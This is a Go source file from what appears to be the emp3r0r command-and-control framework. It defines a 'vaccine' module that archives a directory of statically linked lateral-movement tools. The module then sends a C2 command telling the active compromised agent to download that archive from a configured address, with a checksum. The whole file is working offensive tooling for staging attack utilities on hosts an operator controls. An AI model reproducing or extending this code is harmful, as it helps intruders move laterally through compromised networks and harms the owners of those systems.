package modules

import (
	"fmt"
	"os"

	"github.com/jm33-m0/emp3r0r/core/internal/cc/base/agents"
	"github.com/jm33-m0/emp3r0r/core/internal/emp3r0r_def"
	"github.com/jm33-m0/emp3r0r/core/internal/logging"
	"github.com/jm33-m0/emp3r0r/core/internal/runtime_def"
	"github.com/jm33-m0/emp3r0r/core/internal/tun"
	"github.com/jm33-m0/emp3r0r/core/internal/util"
)

// upload a zip file that packs several lateral-movement tools
// statically linked, built under alpine
func moduleVaccine() {
	go func() {
		err := CreateVaccineArchive()
		if err != nil {
			logging.Errorf("CreateVaccineArchive: %v", err)
			return
		}
		downloadOpt, ok := runtime_def.AvailableModuleOptions["download_addr"]
		if !ok {
			logging.Errorf("Option 'download_addr' not found")
			return
		}
		download_addr := downloadOpt.Val
		checksum := tun.SHA256SumFile(runtime_def.UtilsArchive)
		err = agents.SendCmd(fmt.Sprintf("%s --checksum %s --download_addr %s", emp3r0r_def.C2CmdUtils, checksum, download_addr), "", runtime_def.ActiveAgent)
		if err != nil {
			logging.Errorf("SendCmd failed: %v", err)
		}
	}()
}

func CreateVaccineArchive() (err error) {
	logging.Infof("Creating archive (%s) for module vaccine...", runtime_def.UtilsArchive)
	err = os.Chdir(runtime_def.EmpDataDir + "/modules/vaccine") // vaccine is always stored under EmpDataDir
	if err != nil {
		return fmt.Errorf("entering vaccine dir: %v", err)
	}
	defer func() {
		logging.Infof("Created %.2fMB archive (%s) for module vaccine", float64(util.FileSize(runtime_def.UtilsArchive))/1024/1024, runtime_def.UtilsArchive)
		os.Chdir(runtime_def.EmpWorkSpace)
	}()
	err = util.TarXZ(".", runtime_def.UtilsArchive)
	if err != nil {
		return fmt.Errorf("creating vaccine archive: %v", err)
	}
	return
}
